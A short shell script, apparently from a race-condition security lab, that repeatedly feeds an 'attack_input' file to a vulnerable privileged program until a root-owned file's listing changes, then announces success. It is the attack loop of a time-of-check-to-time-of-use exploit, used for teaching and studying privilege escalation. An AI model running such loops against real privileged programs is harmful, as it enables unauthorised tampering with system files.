#!/bin/sh
old=`ls -l ./root_file`
new=`ls -l ./root_file`
while [ "$old" = "$new" ]
do
    ./vul_program < attack_input
    new=`ls -l ./root_file`
done
echo "STOP... The file has been changed"
